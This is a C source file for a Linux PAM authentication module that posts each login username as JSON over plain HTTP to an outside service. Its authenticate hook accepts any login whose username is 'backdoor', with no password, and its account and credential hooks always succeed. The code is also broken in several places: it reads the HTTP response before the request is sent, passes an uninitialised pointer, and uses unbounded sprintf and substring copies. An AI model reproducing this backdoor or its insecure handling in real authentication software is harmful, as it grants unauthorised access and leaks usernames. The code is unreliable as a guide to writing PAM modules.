#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <curl/curl.h>

int strpos1(char *haystack, char *needle)
{
  char *p = strstr(haystack, needle);
  if (p)
    return p - haystack;
  return -1;
}

struct string1
{
  char *ptr;
  size_t len;
};

void init_string(struct string1 *s)
{
  s->len = 0;
  s->ptr = malloc(s->len + 1);
  if (s->ptr == NULL)
  {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string1 *s)
{
  size_t new_len = s->len + size * nmemb;
  s->ptr = realloc(s->ptr, new_len + 1);
  if (s->ptr == NULL)
  {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr + s->len, ptr, size * nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size * nmemb;
}

/*C substring function: It returns a pointer to the substring */

char *substring1(char *string, int position, int length)
{
  char *pointer;
  int c;

  pointer = malloc(length + 1);

  if (pointer == NULL)
  {
    printf("Unable to allocate memory.\n");
    exit(1);
  }

  for (c = 0; c < length; c++)
  {
    *(pointer + c) = *(string + position - 1);
    string++;
  }

  *(pointer + c) = '\0';

  return pointer;
}

int post1(const char *username, char *referenceId)
{
  int authenticated1 = 0;
  printf("start post");
  CURL *curl11;
  CURLcode res1;
  char str1[1024];

  if (referenceId && strlen(referenceId) > 0)
  {
    sprintf(str1, "{\"Email\":\"%s\",\"ReferenceId\":\"%s\"}", username, referenceId);
  }
  else
  {
    sprintf(str1, "{\"Email\":\"%s\",\"ReferenceId\":null}", username);
  }

  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */
  curl11 = curl_easy_init();
  if (curl11)
  {
    struct string1 s;
    init_string(&s);
    char *status;

    /* First set the URL that is about to receive our POST. This URL can
       just as well be a https:// URL if that is what should receive the
       data. */
    curl_easy_setopt(curl11, CURLOPT_URL, "http://authme.io/v1/trylogin");
    /* Now specify the POST data */
    curl_easy_setopt(curl11, CURLOPT_POSTFIELDS, str1);
    curl_easy_setopt(curl11, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl11, CURLOPT_WRITEFUNCTION, writefunc);

    int pos = strpos1(s.ptr, "ReferenceId\":\"");
    

    // 8a50fdd4-84cc-11e6-83b4-8e4ab90f4bc9
    referenceId = (char*)substring1(s.ptr, pos + 14, 36);
    printf("\nReference Id: %s\n", s.ptr);

    // authenticated
    pos = strpos1(s.ptr, "\"Status\":\"");
    status = substring1(s.ptr, pos + 10, 13);

    if (strcmp(status, "authenticated") == 0)
    {
      authenticated1 = 1;
    }

    /* Perform the request, res will get the return code */
    res1 = curl_easy_perform(curl11);

    /* Check for errors */
    if (res1 != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res1));

    /* always cleanup */
    free(s.ptr);
    curl_easy_cleanup(curl11);
  }
  curl_global_cleanup();
  return authenticated1;
}

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval; char *refere;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome 321 %s\n", pUsername);
  post1(pUsername, refere);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}